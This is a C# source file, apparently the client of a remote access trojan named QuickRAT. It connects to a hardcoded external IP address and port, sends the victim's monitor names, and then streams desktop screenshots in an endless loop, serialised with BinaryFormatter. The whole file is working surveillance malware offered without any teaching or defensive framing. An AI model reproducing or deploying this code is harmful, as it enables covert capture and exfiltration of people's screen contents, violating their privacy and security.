using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace QuickRAT_Client
{
    public partial class MainForm : Form
    {
        internal TcpClient client = new TcpClient();
        internal NetworkStream mainStream;
        internal NetworkStream monitorStream;
        internal int port = 100;
        internal string IP = "5.94.167.86";
        internal string[] monitorsArray = new string[10];
        internal string monitorString;

        public MainForm()
        {
            InitializeComponent();
            CountMonitors();
            try
            {
                client.Connect(IP, port);
            }
            catch (Exception e)
            {
                MessageBox.Show("Error " + e);
            }
            new Thread(SendDesktopImage).Start();
            SendMonitors();
        }

        private static Image GrabDesktop(int index)
        {
            Rectangle bound = Screen.AllScreens[index].Bounds;
            Bitmap screenshot = new Bitmap(bound.Width, bound.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            Graphics graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(bound.X, bound.Y,0,0,bound.Size,CopyPixelOperation.SourceCopy);

            return screenshot;
        }

        private string CountMonitors()
        {
            monitorString = string.Join(",", Screen.AllScreens.Select(screen => screen.DeviceName));
            return monitorString;
        }

        private void SendMonitors()
        {
            int byteCount = Encoding.ASCII.GetByteCount(monitorString + 1);
            byte[] sendData = new byte[byteCount];
            sendData = Encoding.ASCII.GetBytes(monitorString);
            monitorStream = client.GetStream();
            monitorStream.Write(sendData, 0, sendData.Length);
        }

        private void SendDesktopImage()
        {
            BinaryFormatter binFormatter = new BinaryFormatter();
            while (true)
            {
                mainStream = client.GetStream();
                binFormatter.Serialize(mainStream, GrabDesktop(0));
            }
        }
    }
}
